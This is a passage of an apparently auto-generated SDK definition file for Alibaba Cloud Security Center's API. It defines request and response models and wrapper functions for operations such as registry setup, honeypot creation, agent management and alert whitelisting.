  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model AddPrivateRegistryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddPrivateRegistryResponseBody(name='body'),
}

/**
 * @summary Adds a self-managed image repository.
 *
 * @param request AddPrivateRegistryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddPrivateRegistryResponse
 */
async function addPrivateRegistryWithOptions(request: AddPrivateRegistryRequest, runtime: Util.RuntimeOptions): AddPrivateRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.domainName)) {
    query['DomainName'] = request.domainName;
  }
  if (!Util.isUnset(request.extraParam)) {
    query['ExtraParam'] = request.extraParam;
  }
  if (!Util.isUnset(request.netType)) {
    query['NetType'] = request.netType;
  }
  if (!Util.isUnset(request.password)) {
    query['Password'] = request.password;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.protocolType)) {
    query['ProtocolType'] = request.protocolType;
  }
  if (!Util.isUnset(request.registryHostIp)) {
    query['RegistryHostIp'] = request.registryHostIp;
  }
  if (!Util.isUnset(request.registryRegionId)) {
    query['RegistryRegionId'] = request.registryRegionId;
  }
  if (!Util.isUnset(request.registryType)) {
    query['RegistryType'] = request.registryType;
  }
  if (!Util.isUnset(request.registryVersion)) {
    query['RegistryVersion'] = request.registryVersion;
  }
  if (!Util.isUnset(request.transPerHour)) {
    query['TransPerHour'] = request.transPerHour;
  }
  if (!Util.isUnset(request.userName)) {
    query['UserName'] = request.userName;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddPrivateRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds a self-managed image repository.
 *
 * @param request AddPrivateRegistryRequest
 * @return AddPrivateRegistryResponse
 */
async function addPrivateRegistry(request: AddPrivateRegistryRequest): AddPrivateRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return addPrivateRegistryWithOptions(request, runtime);
}

model AddProtectVpcListRequest {
  addVpcInstanceIdList?: string(name='AddVpcInstanceIdList', description='Collection of new VPC instance IDs.
> Call the [DescribeVpcList](~~DescribeVpcList~~) interface to obtain this parameter.', example='["vpc-bp1vnpgotyzay6p5i****","vpc-bp1vnpgotyzay6p5i****"]'),
  delVpcInstanceIdList?: string(name='DelVpcInstanceIdList', description='Collection of VPC instance IDs to be deleted.
> Call the [DescribeVpcList](~~DescribeVpcList~~) interface to obtain this parameter.', example='["vpc-bp1vnpgotyzay6p5i****","vpc-bp1vnpgotyzay6p5i****"]'),
}

model AddProtectVpcListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of this request, which is a unique identifier generated by Alibaba Cloud for this request and can be used for troubleshooting and problem localization.', example='FD394AF6-591E-5168-8C8C-4C7847369C77'),
}

model AddProtectVpcListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddProtectVpcListResponseBody(name='body'),
}

/**
 * @summary Add or update the whitelist for VPC purchases
 *
 * @param request AddProtectVpcListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddProtectVpcListResponse
 */
async function addProtectVpcListWithOptions(request: AddProtectVpcListRequest, runtime: Util.RuntimeOptions): AddProtectVpcListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.addVpcInstanceIdList)) {
    query['AddVpcInstanceIdList'] = request.addVpcInstanceIdList;
  }
  if (!Util.isUnset(request.delVpcInstanceIdList)) {
    query['DelVpcInstanceIdList'] = request.delVpcInstanceIdList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddProtectVpcList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Add or update the whitelist for VPC purchases
 *
 * @param request AddProtectVpcListRequest
 * @return AddProtectVpcListResponse
 */
async function addProtectVpcList(request: AddProtectVpcListRequest): AddProtectVpcListResponse {
  var runtime = new Util.RuntimeOptions{};
  return addProtectVpcListWithOptions(request, runtime);
}

model AddPublishBatchRequest {
  batchName?: string(name='BatchName', description='The name of the release batch.

This parameter is required.', example='test'),
  interval?: int32(name='Interval', description='The interval between two release batches.

This parameter is required.', example='60'),
  operationBase?: int32(name='OperationBase', description='The dimension based on which the asset is selected. Valid values:

*   **0**: selects the asset by instance.
*   **1**: selects the asset by machine group.
*   **2**: selects the asset by the ID of the instance that is deployed in the virtual private cloud (VPC).', example='0'),
  upgradeVersion?: string(name='UpgradeVersion', description='The version to which you want to upgrade the agent.

This parameter is required.', example='0.0.9'),
}

model AddPublishBatchResponseBody = {
  batchId?: long(name='BatchId', description='The ID of the release batch.', example='1'),
  requestId?: string(name='RequestId', description='The request ID.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model AddPublishBatchResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddPublishBatchResponseBody(name='body'),
}

/**
 * @summary Upgrades the Security Center agent in batches.
 *
 * @param request AddPublishBatchRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddPublishBatchResponse
 */
async function addPublishBatchWithOptions(request: AddPublishBatchRequest, runtime: Util.RuntimeOptions): AddPublishBatchResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.batchName)) {
    query['BatchName'] = request.batchName;
  }
  if (!Util.isUnset(request.interval)) {
    query['Interval'] = request.interval;
  }
  if (!Util.isUnset(request.operationBase)) {
    query['OperationBase'] = request.operationBase;
  }
  if (!Util.isUnset(request.upgradeVersion)) {
    query['UpgradeVersion'] = request.upgradeVersion;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddPublishBatch',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Upgrades the Security Center agent in batches.
 *
 * @param request AddPublishBatchRequest
 * @return AddPublishBatchResponse
 */
async function addPublishBatch(request: AddPublishBatchRequest): AddPublishBatchResponse {
  var runtime = new Util.RuntimeOptions{};
  return addPublishBatchWithOptions(request, runtime);
}

model AddSasContainerWebDefenseRuleRequest {
  pathConfDTOList?: [ 
    {
      backupPath?: string(name='BackupPath', description='The backup path.', example='/tmp/test'),
      defenseMode?: string(name='DefenseMode', description='The prevention mode. Valid values:

*   **block**
*   **audit**', example='audit'),
      defensePath?: string(name='DefensePath', description='The path that you want to protect.

This parameter is required.', example='/usr/test/'),
      excludeFile?: string(name='ExcludeFile', description='The file that you want to exclude.', example='/usr/test/aa'),
      excludeFilePath?: string(name='ExcludeFilePath', description='The path to the file that you want to exclude.', example='/usr/test/tt'),
      excludeFileType?: string(name='ExcludeFileType', description='The type of the file that you want to exclude.', example='jsp'),
      guardType?: int32(name='GuardType', description='The protecion mode. Valid values:

*   **0**: basic mode (whitelist)
*   **1**: complex mode (blacklist)

This parameter is required.', example='0'),
      includeFile?: string(name='IncludeFile', description='The file that you want to include.', example='/usr/test/t1'),
      includeFileType?: string(name='IncludeFileType', description='The type of the file that you want to include.', example='*.jsp'),
      processPathList?: [ string ](name='ProcessPathList', description='The processes that you want to add to the whitelist.

This parameter is required.'),
    }
  ](name='PathConfDTOList', description='The paths that you want to protect.'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='test-2020'),
}

model AddSasContainerWebDefenseRuleResponseBody = {
  data?: long(name='Data', description='The unique value of the created rule.', example='200634'),
  requestId?: string(name='RequestId', description='The request ID.', example='8B4B6E6D-B0B0-5F05-A14E-82917D9648EE'),
}

model AddSasContainerWebDefenseRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddSasContainerWebDefenseRuleResponseBody(name='body'),
}

/**
 * @summary Creates a rule for container tamper-proofing.
 *
 * @param request AddSasContainerWebDefenseRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddSasContainerWebDefenseRuleResponse
 */
async function addSasContainerWebDefenseRuleWithOptions(request: AddSasContainerWebDefenseRuleRequest, runtime: Util.RuntimeOptions): AddSasContainerWebDefenseRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.pathConfDTOList)) {
    query['PathConfDTOList'] = request.pathConfDTOList;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddSasContainerWebDefenseRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a rule for container tamper-proofing.
 *
 * @param request AddSasContainerWebDefenseRuleRequest
 * @return AddSasContainerWebDefenseRuleResponse
 */
async function addSasContainerWebDefenseRule(request: AddSasContainerWebDefenseRuleRequest): AddSasContainerWebDefenseRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return addSasContainerWebDefenseRuleWithOptions(request, runtime);
}

model AddSasModuleTrialRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  moduleCode?: string(name='ModuleCode', description='The code of the feature. Valid values:

*   **vulFix**: vulnerability fixing.
*   **cloudSiem**: threat analysis and response.', example='vulFix'),
}

model AddSasModuleTrialResponseBody = {
  data?: {
    trialRecordList?: [ 
      {
        authLimit?: long(name='AuthLimit', description='The quota.', example='100'),
        authLimitList?: string(name='AuthLimitList', description='The list of quotas. This parameter is available if the value of the ModuleCode parameter is cloudSiem. The value of this parameter consists of the log storage capacity for the threat analysis and response feature and the log data to add. Units: GB and GB-day.', example='[1,100]'),
        gmtEnd?: long(name='GmtEnd', description='The end time of the trial use.', example='1638201599999'),
        gmtStart?: long(name='GmtStart', description='The start time of the trial use.', example='1667232000000'),
        moduleCode?: string(name='ModuleCode', description='The code of the feature. Valid values:

*   **vulFix**: vulnerability fixing.
*   **cloudSiem**: threat analysis and response.', example='vulFix'),
        status?: int32(name='Status', description='The status of the trial use. Valid values:

*   **1**: The feature is in trial use.
*   **0**: The trial use ends.', example='1'),
      }
    ](name='TrialRecordList', description='The information about the trial use.'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
}

model AddSasModuleTrialResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddSasModuleTrialResponseBody(name='body'),
}

/**
 * @summary Enables the trial use of Security Center value-added features, including vulnerability fixing and threat analysis and response.
 *
 * @param request AddSasModuleTrialRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddSasModuleTrialResponse
 */
async function addSasModuleTrialWithOptions(request: AddSasModuleTrialRequest, runtime: Util.RuntimeOptions): AddSasModuleTrialResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.moduleCode)) {
    query['ModuleCode'] = request.moduleCode;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddSasModuleTrial',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables the trial use of Security Center value-added features, including vulnerability fixing and threat analysis and response.
 *
 * @param request AddSasModuleTrialRequest
 * @return AddSasModuleTrialResponse
 */
async function addSasModuleTrial(request: AddSasModuleTrialRequest): AddSasModuleTrialResponse {
  var runtime = new Util.RuntimeOptions{};
  return addSasModuleTrialWithOptions(request, runtime);
}

model AddTagWithUuidRequest {
  tagName?: string(name='TagName', description='The name of the tag.

This parameter is required.', example='InternetIp'),
  uuidList?: string(name='UuidList', description='The UUIDs of the servers. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='71f5313e-4355-4c59-86d1-557dda7b****,71f5313e-4355-4c59-86d1-557dda7b****'),
}

model AddTagWithUuidResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
}

model AddTagWithUuidResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddTagWithUuidResponseBody(name='body'),
}

/**
 * @summary Adds a tag to assets.
 *
 * @description Security Center provides asset importance tags and custom tags. You can call the AddTagWithUuid operation to add only a custom tag to assets.
 *
 * @param request AddTagWithUuidRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddTagWithUuidResponse
 */
async function addTagWithUuidWithOptions(request: AddTagWithUuidRequest, runtime: Util.RuntimeOptions): AddTagWithUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tagName)) {
    query['TagName'] = request.tagName;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddTagWithUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds a tag to assets.
 *
 * @description Security Center provides asset importance tags and custom tags. You can call the AddTagWithUuid operation to add only a custom tag to assets.
 *
 * @param request AddTagWithUuidRequest
 * @return AddTagWithUuidResponse
 */
async function addTagWithUuid(request: AddTagWithUuidRequest): AddTagWithUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return addTagWithUuidWithOptions(request, runtime);
}

model AddUninstallClientsByUuidsRequest {
  callMethod?: string(name='CallMethod', description='The method name. Default value: init.', example='init'),
  feedback?: string(name='Feedback', description='The feedback.', example='reinstall'),
  region?: string(name='Region', description='The region in which the server resides.', example='cn-hangzhou'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='1.2.XXX.XXX'),
  uuids?: string(name='Uuids', description='The UUID of the server that you want to unbind. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](https://help.aliyun.com/document_detail/141932.html) operation to query the UUIDs of servers.

This parameter is required.', example='inet-183707ae-3bdf-4db0-b771-3e9962bf****,inet-49dceccc-4f01-469b-8411-2416ea12****'),
}

model AddUninstallClientsByUuidsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3956048F-9D73-5EDB-834B-4827BB483977'),
}

model AddUninstallClientsByUuidsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddUninstallClientsByUuidsResponseBody(name='body'),
}

/**
 * @summary Adds servers from which you want to uninstall the Security Center agent.
 *
 * @param request AddUninstallClientsByUuidsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddUninstallClientsByUuidsResponse
 */
async function addUninstallClientsByUuidsWithOptions(request: AddUninstallClientsByUuidsRequest, runtime: Util.RuntimeOptions): AddUninstallClientsByUuidsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.callMethod)) {
    query['CallMethod'] = request.callMethod;
  }
  if (!Util.isUnset(request.feedback)) {
    query['Feedback'] = request.feedback;
  }
  if (!Util.isUnset(request.region)) {
    query['Region'] = request.region;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddUninstallClientsByUuids',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds servers from which you want to uninstall the Security Center agent.
 *
 * @param request AddUninstallClientsByUuidsRequest
 * @return AddUninstallClientsByUuidsResponse
 */
async function addUninstallClientsByUuids(request: AddUninstallClientsByUuidsRequest): AddUninstallClientsByUuidsResponse {
  var runtime = new Util.RuntimeOptions{};
  return addUninstallClientsByUuidsWithOptions(request, runtime);
}

model AddVpcHoneyPotRequest {
  vpcId?: string(name='VpcId', description='The ID of the virtual private cloud (VPC) in which you want to create a honeypot.

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to obtain the VPC ID. The VPC ID is the value of the InstanceId parameter.

This parameter is required.', example='vpc-p0w5fgkfsl5a6791q****'),
}

model AddVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model AddVpcHoneyPotResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddVpcHoneyPotResponseBody(name='body'),
}

/**
 * @summary Creates a honeypot.
 *
 * @param request AddVpcHoneyPotRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddVpcHoneyPotResponse
 */
async function addVpcHoneyPotWithOptions(request: AddVpcHoneyPotRequest, runtime: Util.RuntimeOptions): AddVpcHoneyPotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddVpcHoneyPot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a honeypot.
 *
 * @param request AddVpcHoneyPotRequest
 * @return AddVpcHoneyPotResponse
 */
async function addVpcHoneyPot(request: AddVpcHoneyPotRequest): AddVpcHoneyPotResponse {
  var runtime = new Util.RuntimeOptions{};
  return addVpcHoneyPotWithOptions(request, runtime);
}

model AdvanceSecurityEventOperationsRequest {
  eventName?: string(name='EventName', description='The alert name.', example='Execution of malicious script code'),
  eventType?: string(name='EventType', description='The alert event type. Valid values:

*   Suspicious process
*   Webshell
*   Unusual logon
*   Exception
*   Sensitive file tampering
*   Malicious process (cloud threat detection)
*   Unusual network connection
*   Abnormal account
*   Application intrusion event
*   Cloud threat detection
*   Precision defense
*   Application whitelist
*   Persistent webshell
*   Web application threat detection
*   Malicious script
*   Threat intelligence
*   Malicious network activity
*   Cluster exception
*   Webshell (on-premises threat detection)
*   Vulnerability exploitation
*   Malicious process (on-premises threat detection)
*   Trusted exception
*   Others

For more information about alert types, see [Alerts](https://help.aliyun.com/document_detail/68388.html).', example='Malicious script'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  ruleId?: int32(name='RuleId', description='The rule ID.', example='123'),
}

model AdvanceSecurityEventOperationsResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-XXXXXXXXX'),
  securityEventOperationsResponse?: [ 
    {
      markField?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', description='The alias of the field that is used in the whitelist rule.', example='file path'),
          filedName?: string(name='FiledName', description='The field that is used in the whitelist rule.', example='filePath'),
          markMisType?: string(name='MarkMisType', description='The operation that is used in the whitelist rule. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **regex**: regular expression
*   **strEqual**: equals
*   **strNotEqual**: does not equal', example='contains'),
          markMisValue?: string(name='MarkMisValue', description='The value of the field that is used in the whitelist rule.', example='2022-04-25 10:11:04'),
          supportedMisType?: [ string ](name='SupportedMisType', description='The operation that is used and can be modified in the whitelist rule. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **regex**: regular expression
*   **strEqual**: equals
*   **strNotEqual**: does not equal'),
        }
      ](name='MarkField', description='The object on which the operation is performed. This parameter is required when you set the OperationCode parameter to **advance_mark_mis_info**.'),
      markFieldsSource?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', description='The alias of the field that can be used in the whitelist rule.', example='file path'),
          filedName?: string(name='FiledName', description='The field that can be used in the whitelist rule.', example='filePath'),
          markMisValue?: string(name='MarkMisValue', description='The value of the field that can be used in the whitelist rule.', example='contains'),
          supportedMisType?: [ string ](name='SupportedMisType', description='The operation that is supported in the whitelist rule. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **regex**: regular expression
*   **strEqual**: equals
*   **strNotEqual**: does not equal'),
        }
      ](name='MarkFieldsSource', description='The metadata configuration returned by the advanced whitelist rule.'),
      operationCode?: string(name='OperationCode', description='The operation performed to handle the alert. Valid values:

*   **block_ip**: blocks the alert.
*   **advance_mark_mis_info**: adds the alert to the whitelist.
*   **ignore**: ignores the alert.
*   **manual_handled**: marks the alert as manually handled.
*   **kill_process**: terminates the malicious process.
*   **cleanup**: performs in-depth virus detection and removal.
*   **kill_and_quara**: performs virus detection and removal.
*   **disable_malicious_defense**: turns off malicious defense behavior.
*   **client_problem_check**: performs troubleshooting.
*   **quara**: performs quarantine operations.', example='advance_mark_mis_info'),
      operationParams?: string(name='OperationParams', description='The configuration of the operation performed to handle the alert event.', example='{\\\\"subOperation\\\\":\\\\"killByMd5andPath\\\\"}'),
      userCanOperate?: boolean(name='UserCanOperate', description='Indicates whether the operation can be performed.

*   **true**: The operation can be performed.
*   **false**: The operation cannot be performed.', example='false'),
    }
  ](name='SecurityEventOperationsResponse', description='The operation performed on the alert event.'),
}

model AdvanceSecurityEventOperationsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AdvanceSecurityEventOperationsResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of an advanced whitelist rule.
 *
 * @param request AdvanceSecurityEventOperationsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AdvanceSecurityEventOperationsResponse
 */
async function advanceSecurityEventOperationsWithOptions(request: AdvanceSecurityEventOperationsRequest, runtime: Util.RuntimeOptions): AdvanceSecurityEventOperationsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.eventType)) {
    query['EventType'] = request.eventType;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AdvanceSecurityEventOperations',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of an advanced whitelist rule.
 *
 * @param request AdvanceSecurityEventOperationsRequest
 * @return AdvanceSecurityEventOperationsResponse
 */
async function advanceSecurityEventOperations(request: AdvanceSecurityEventOperationsRequest): AdvanceSecurityEventOperationsResponse {
  var runtime = new Util.RuntimeOptions{};
  return advanceSecurityEventOperationsWithOptions(request, runtime);
}

model BatchCreateMaliciousNoteRequest {
  imageMaliciousFileList?: [ 
    {
      eventId?: long(name='EventId', description='The ID of the alert.

>  You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the alert IDs.', example='1'),
      note?: string(name='Note', description='The description.', example='Malware sample'),
    }
  ](name='ImageMaliciousFileList', description='The batches.'),
}

model BatchCreateMaliciousNoteResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
  success?: boolean(name='Success', description='Indicates whether the call is successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model BatchCreateMaliciousNoteResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: BatchCreateMaliciousNoteResponseBody(name='body'),
}

/**
 * @summary Adds alert description in batches.
 *
 * @param request BatchCreateMaliciousNoteRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return BatchCreateMaliciousNoteResponse
 */
async function batchCreateMaliciousNoteWithOptions(request: BatchCreateMaliciousNoteRequest, runtime: Util.RuntimeOptions): BatchCreateMaliciousNoteResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.imageMaliciousFileList)) {
    query['ImageMaliciousFileList'] = request.imageMaliciousFileList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'BatchCreateMaliciousNote',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds alert description in batches.
 *
 * @param request BatchCreateMaliciousNoteRequest
 * @return BatchCreateMaliciousNoteResponse
 */
async function batchCreateMaliciousNote(request: BatchCreateMaliciousNoteRequest): BatchCreateMaliciousNoteResponse {
  var runtime = new Util.RuntimeOptions{};
  return batchCreateMaliciousNoteWithOptions(request, runtime);
}

model BatchDeleteMaliciousFileWhitelistConfigRequest {
  configIdList?: [ long ](name='ConfigIdList', description='The IDs of the whitelist rules. You can call the [ListMaliciousFileWhitelistConfigs](~~ListMaliciousFileWhitelistConfigs~~) operation to query the IDs of whitelist rules.'),
}

model BatchDeleteMaliciousFileWhitelistConfigResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code. The status code 200 indicates that the request was successful.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='A3D7C47D-3F11-57BB-90E8-E5C20C61****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model BatchDeleteMaliciousFileWhitelistConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: BatchDeleteMaliciousFileWhitelistConfigResponseBody(name='body'),
}

/**
 * @summary Deletes whitelist rules for alerts generated for sensitive files that are detected by using the agentless detection feature in batches.
 *
 * @param request BatchDeleteMaliciousFileWhitelistConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return BatchDeleteMaliciousFileWhitelistConfigResponse
 */
async function batchDeleteMaliciousFileWhitelistConfigWithOptions(request: BatchDeleteMaliciousFileWhitelistConfigRequest, runtime: Util.RuntimeOptions): BatchDeleteMaliciousFileWhitelistConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configIdList)) {
    query['ConfigIdList'] = request.configIdList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'BatchDeleteMaliciousFileWhitelistConfig',
